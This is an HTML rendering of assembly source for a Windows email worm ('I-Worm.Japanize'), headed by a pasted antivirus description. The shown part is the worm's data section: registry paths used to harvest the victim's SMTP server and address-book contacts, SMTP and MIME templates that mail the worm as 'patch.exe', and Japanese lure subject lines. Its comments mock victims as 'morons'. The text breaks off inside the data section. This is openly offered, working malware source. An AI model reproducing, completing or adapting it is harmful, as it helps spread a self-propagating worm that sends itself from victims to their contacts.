<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Zircon.c - japanize.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;;  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="sc0">
</span><span class="sc1">;;;                         I-Worm.Japanize</span><span class="sc0">
</span><span class="sc1">;;;  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;  </span><span class="sc0">
</span><span class="sc1">;;;  This has some bugs.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; Here TrendMicro description:</span><span class="sc0">
</span><span class="sc1">;;;  ******************************************************************</span><span class="sc0">
</span><span class="sc1">;;;  http://www.antivirus.com/vinfo/virusencyclo/default5.asp?VName=WORM_FBOUND.B&amp;VSect=T</span><span class="sc0">
</span><span class="sc1">;;;  Details:</span><span class="sc0">
</span><span class="sc1">;;;The details of the email this worm arrives with may be as follows:</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;To: &lt;recipient&gt; </span><span class="sc0">
</span><span class="sc1">;;;Subject: &lt;"Important" or random Japanese text(applicable on Japanese supported platforms)&gt;</span><span class="sc0">
</span><span class="sc1">;;;Message Body: &lt;blank&gt;</span><span class="sc0">
</span><span class="sc1">;;;Attachment: patch.exe </span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;It uses its own SMTP engine and uses the following registry key to retrieve the default SMTP server of the infected system: </span><span class="sc0">
</span><span class="sc1">;;;HKEY_CURRENT_USER\Software\Microsoft\
;;;Internet Account Manager\Accounts\00000001</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;It uses the following registry key to retrieve email addresses from the infected user's Windows Address Book (WAB):</span><span class="sc0">
</span><span class="sc1">;;;HKEY_CURRENT_USER\Software\Microsoft\WAB\
;;;WAB4Wab File Name = Åg&lt;pathname of WAB file&gt;Åh</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;The email arrives with the attachment PATCH.EXE. If the email address of its target ;;;user ends with the extension .jp, the worm randomly selects a phrase, from a list of 17 possible Japanese phrases below, and uses one as the subject of the email: </span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;The English translation for the above Japanese text are as follows: </span><span class="sc0">
</span><span class="sc1">;;;Re: the issue that you mentioned</span><span class="sc0">
</span><span class="sc1">;;;Re: important</span><span class="sc0">
</span><span class="sc1">;;;Re: long time no see</span><span class="sc0">
</span><span class="sc1">;;;Re: top secret</span><span class="sc0">
</span><span class="sc1">;;;Re: Hello</span><span class="sc0">
</span><span class="sc1">;;;Re: important information</span><span class="sc0">
</span><span class="sc1">;;;Re: data</span><span class="sc0">
</span><span class="sc1">;;;the issue that you mentioned</span><span class="sc0">
</span><span class="sc1">;;;important</span><span class="sc0">
</span><span class="sc1">;;;long time no see</span><span class="sc0">
</span><span class="sc1">;;;top secret</span><span class="sc0">
</span><span class="sc1">;;;hello</span><span class="sc0">
</span><span class="sc1">;;;important information</span><span class="sc0">
</span><span class="sc1">;;;data</span><span class="sc0">
</span><span class="sc1">;;;frog</span><span class="sc0">
</span><span class="sc1">;;;shit</span><span class="sc0">
</span><span class="sc1">;;;shit</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;Otherwise, it uses the subject ÅgImportant."</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;This non-destructive worm does not drop files or create any registry entries. Its propagation depends on the execution of the file attachment in the email. </span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;The following text strings are found in the worm body:</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;ÅeXXXXXXXXXXXXXXXXXXXXXXXÅf</span><span class="sc0">
</span><span class="sc1">;;;ÅeXXXXX I-Worm.Japanize XXXXXÅf</span><span class="sc0">
</span><span class="sc1">;;;ÅeXXXXXXXXXXXXXXXXXXXXXXXÅf </span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;  </span><span class="sc0">
    
    </span><span class="sc2">.586p</span><span class="sc0">
    </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
    </span><span class="sc5">locals</span><span class="sc0">
    </span><span class="sc5">jumps</span><span class="sc0">

    
</span><span class="sc1">;;;  some lazy shit</span><span class="sc0">
</span><span class="sc5">callW</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">    </span><span class="sc5">@@@x</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">@@@x</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@@x</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">

</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">by</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">CRLF</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc6">rdtsc</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">310fh</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">AF_INET</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SOCK_STREAM</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">GHND</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
 

</span><span class="sc1">;;;  ----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">hReg</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc1">;  registry handle</span><span class="sc0">
</span><span class="sc5">str_SMInternetAccountManager</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Software\Microsoft\Internet Account Manager'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMIAccounts</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">'Software\Microsoft\Internet Account Manager\Accounts\'
</span><span class="sc5">AccountIdx</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;  account index</span><span class="sc0">
</span><span class="sc5">bufsiz_accountidx</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc1">;  size</span><span class="sc0">
    
</span><span class="sc5">str_DMA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Default Mail Account'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMTPNAME</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SMTP Server'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMTPEmailAddr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SMTP Email Address'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMWab4</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Software\Microsoft\WAB\WAB4\Wab File Name'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">SMTP_Server</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;  default smtp server</span><span class="sc0">
</span><span class="sc5">bufsiz_SMTPSERVER</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
</span><span class="sc5">morons_Mailaddr</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  mail address of moron :)</span><span class="sc0">
</span><span class="sc5">bufsiz_morons_mailaddr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">wab4_path</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;  wab file path</span><span class="sc0">
</span><span class="sc5">bufsiz_wab4_path</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">hwab4file</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  wab4 file handle</span><span class="sc0">
</span><span class="sc5">hwab4map</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">hwab4mapview</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">myfilename</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  handle of myself</span><span class="sc0">
</span><span class="sc5">hmyfile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  file size</span><span class="sc0">

</span><span class="sc5">hmemout0</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ptr_myself</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hmemout</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  globalalloc</span><span class="sc0">
</span><span class="sc5">ptr_base64buf</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  globallock</span><span class="sc0">

</span><span class="sc5">target_mailaddr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">sockaddr_in</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">sin_family</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_port</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_addr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_zero</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">len_sockaddr_in</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">

</span><span class="sc5">sock</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;  socket descriptor</span><span class="sc0">

</span><span class="sc5">recv_buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  recv buffer</span><span class="sc0">

</span><span class="sc5">jflag</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;  japanese or not</span><span class="sc0">

</span><span class="sc5">smtp_HELO</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HELO localhost'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_HELO</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_HELO</span><span class="sc0">
</span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MAIL FROM: '</span><span class="sc0">
</span><span class="sc5">len_smtp_MAIL_FROM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">
</span><span class="sc1">;crlf</span><span class="sc0">
</span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RCPT TO: '</span><span class="sc0">
</span><span class="sc5">len_smtp_RCPT_TO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">
</span><span class="sc1">;crlf</span><span class="sc0">
</span><span class="sc5">smtp_DATA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_DATA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_DATA</span><span class="sc0">
</span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FROM: '</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_FROM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">
</span><span class="sc5">smtp_BODY_TO</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'TO: '</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_TO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_TO</span><span class="sc0">
</span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'SUBJECT: Important'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_SUBJECT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">

</span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_DOT_CRLF</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">
</span><span class="sc5">smtp_QUIT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_QUIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_QUIT</span><span class="sc0">

</span><span class="sc5">smtp_crlf</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">

</span><span class="sc5">smtp_MIME_h</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: multipart/mixed; boundary="Boundary-a8dfidaoRadvfuck"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--Boundary-a8dfidaoRadvfuck'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: text/plain; charset=iso-2022-jp'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: 7bit'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Description: Mail message body'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">            </span><span class="sc1">;  text</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--Boundary-a8dfidaoRadvfuck'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: application/x-msdownload; name="patch.exe"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Disposition: attachment;  filename="patch.exe"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: BASE64'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_MIME_h</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_h</span><span class="sc0">
    </span><span class="sc1">;;  base64 body</span><span class="sc0">
</span><span class="sc5">smtp_MIME_e</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'--Boundary-a8dfidaoRadvfuck--'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_MIME_e</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_e</span><span class="sc0">

</span><span class="sc5">r_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">10987293h</span><span class="sc0">   </span><span class="sc1">;  random seed</span><span class="sc0">


</span><span class="sc5">smtp_jsubject_1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'SUBJECT: =?ISO-2022-JP?B?'</span><span class="sc0">
</span><span class="sc5">len_smtp_jsubject_1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_jsubject_1</span><span class="sc0">
</span><span class="sc5">smtp_jsubject_2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'?='</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_jsubject_2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_jsubject_2</span><span class="sc0">


</span><span class="sc1">;;;  japanese subjects table</span><span class="sc0">
</span><span class="sc5">japanese_subjects</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_01</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_02</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_03</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_04</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_05</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_06</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_07</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_08</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_09</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_10</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_11</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_12</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_13</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_14</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_15</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_16</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_17</span><span class="sc0">
</span><span class="sc5">num_of_jsub</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">japanese_subjects</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">js_01</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCPUVNVxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  èdóv</span><span class="sc0">
